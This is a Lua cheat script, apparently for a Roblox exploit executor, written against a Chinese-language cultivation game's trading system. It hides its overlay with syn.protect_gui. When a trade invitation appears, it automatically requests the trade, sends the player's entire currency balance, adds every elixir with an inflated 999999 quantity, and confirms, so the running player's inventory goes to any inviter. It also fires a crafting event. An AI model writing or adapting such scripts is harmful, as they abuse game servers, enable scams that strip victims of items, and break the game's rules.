local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")

-- 等待界面加载完成
local GUI = PlayerGui:WaitForChild("GUI")
local BaseUI = GUI:WaitForChild("\229\159\186\231\161\128")
local TimeIndicator = BaseUI:WaitForChild("\229\128\146\232\174\161\230\151\182\230\161\134")

-- 获取事件对象
local elixirSyncEvent = ReplicatedStorage
    ["\228\186\139\228\187\182"]
    ["\229\174\162\230\136\183\231\171\175"]
    ["\229\174\162\230\136\183\231\171\175\228\184\185\232\141\175"]
    ["\228\184\185\232\141\175\230\149\176\230\141\174\229\143\152\229\140\150"]
local addTradeItemEvent = ReplicatedStorage
    ["\228\186\139\228\187\182"]
    ["\229\133\172\231\148\168"]
    ["\228\186\164\230\152\147"]
    ["\230\150\176\229\162\158\228\186\164\230\152\147\231\137\169\229\147\129"]

local requestTradeEvent = ReplicatedStorage
    ["\228\186\139\228\187\182"]
    ["\229\133\172\231\148\168"]
    ["\228\186\164\230\152\147"]
    :WaitForChild("\231\148\179\232\175\183\228\186\164\230\152\147")

local confirmTradeEvent = ReplicatedStorage
    :WaitForChild("\228\186\139\228\187\182")
    :WaitForChild("\229\133\172\231\148\168")
    :WaitForChild("\228\186\164\230\152\147")
    :WaitForChild("\233\148\129\229\174\154\228\186\164\230\152\147")

local elixirData = {}

-- 数据同步处理
elixirSyncEvent.Event:Connect(function(data)
    elixirData = data
end)

-- 系统控制变量
local running = true

-- 创建监控界面
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoTradeMonitor"
if syn then syn.protect_gui(screenGui) end
screenGui.Parent = PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 320, 0, 120)
mainFrame.Position = UDim2.new(0, 10, 1, -140)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.BorderSizePixel = 2
mainFrame.Parent = screenGui

local titleBar = Instance.new("TextLabel")
titleBar.Size = UDim2.new(1, 0, 0, 20)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.Text = "自动交易系统 (仅丹药)"
titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(0.9, 0, 0.5, 0)
infoLabel.Position = UDim2.new(0.05, 0, 0.1, 20)
infoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.SourceSansBold
infoLabel.TextSize = 18
infoLabel.TextXAlignment = Enum.TextXAlignment.Center
infoLabel.TextYAlignment = Enum.TextYAlignment.Center
local textStroke = Instance.new("UIStroke")
textStroke.Color = Color3.fromRGB(255, 0, 0)
textStroke.Thickness = 0.1
textStroke.Parent = infoLabel
infoLabel.Text = "自动交易启动中...\n模式: 仅丹药"
infoLabel.Parent = mainFrame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0.9, 0, 0.25, 0)
closeButton.Position = UDim2.new(0.05, 0, 0.7, 0)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
closeButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
closeButton.Text = "关闭系统"
closeButton.Parent = mainFrame

-- 窗口拖拽系统
local dragging = false
local dragStart, startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
titleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- 关闭功能
closeButton.MouseButton1Click:Connect(function()
    running = false
    screenGui:Destroy()
end)

-- 丹药交易函数
local function tradeElixir(index)
    local success, err = pcall(function()
        addTradeItemEvent:FireServer("\228\184\185\232\141\175", index, 999999)
    end)
    if success then
        print("成功交易丹药:", index)
    else
        warn("丹药交易失败:", index, "错误:", err)
    end
end

-- 等待交易界面可见
local function waitForTradeUI()
    local startTime = tick()
    local maxWaitTime = 10
    while tick() - startTime < maxWaitTime and running do
        local success, tradeUI = pcall(function()
            return LocalPlayer.PlayerGui.GUI["\228\186\140\231\186\167\231\149\140\233\157\162"]["\228\186\164\230\152\147"]["\228\186\164\230\152\147\231\149\140\233\157\162"]
        end)
        if success and tradeUI and tradeUI.Visible then
            return true
        end
        wait(0.1)
    end
    return false
end

-- 主交易循环
coroutine.wrap(function()
    while running do
        if TimeIndicator.Visible then
            -- 获取交易邀请信息
            local tradeInviteText = ""
            pcall(function()
                tradeInviteText = LocalPlayer.PlayerGui.GUI["\229\159\186\231\161\128"]["\229\128\146\232\174\161\230\151\182\230\161\134"]["\232\131\140\230\153\175"]["\229\134\133\229\174\185"].Text
            end)
            local invitingPlayer = tradeInviteText:match("(.+) has invited you to trade")
            if invitingPlayer then
                print("收到交易邀请来自:", invitingPlayer)
            end

            -- 直接触发交易请求
            pcall(function()
                requestTradeEvent:FireServer()
            end)
            wait(1.1)

            local core = tonumber(LocalPlayer.PlayerGui.GUI["\228\186\140\231\186\167\231\149\140\233\157\162"]["\228\186\164\230\152\147"]["\228\186\164\230\152\147\231\149\140\233\157\162"]["\230\136\145\231\154\132\232\131\140\229\140\133"]["\232\180\167\229\184\129"]["\231\190\189\230\160\184"]["\229\128\188"].Text)
            game:GetService("ReplicatedStorage"):WaitForChild("\228\186\139\228\187\182"):WaitForChild("\229\133\172\231\148\168"):WaitForChild("\228\186\164\230\152\147"):WaitForChild("\228\186\164\230\152\147\231\190\189\230\160\184"):FireServer(core)

            -- 执行丹药交易
            if elixirData and elixirData["背包"] then
                for slot, item in pairs(elixirData["背包"]) do
                    if type(item) == "table" then
                        local itemIndex = item["索引"] or item.Index or item.id
                        if itemIndex then
                            tradeElixir(itemIndex)
                        end
                    end
                end
            else
                warn("丹药数据未加载或背包为空")
            end

            -- 确认交易
            if waitForTradeUI() then
                pcall(function()
                    confirmTradeEvent:FireServer(true)
                    warn("交易确认界面在指定时间内出现")
                end)
            else
                warn("交易确认界面未在指定时间内出现")
            end

            wait(1)
        else
            wait(0.1)
        end
    end
end)()

infoLabel.Text = "自动交易已启动！\n模式: 简易丹药 V1.0"
wait(0.6)

local elixirEvent = ReplicatedStorage:FindFirstChild("\228\186\139\228\187\182")
    :FindFirstChild("\229\133\172\231\148\168")
    :FindFirstChild("\231\130\188\228\184\185")
    :FindFirstChild("\229\136\182\228\189\156")
elixirEvent:FireServer()
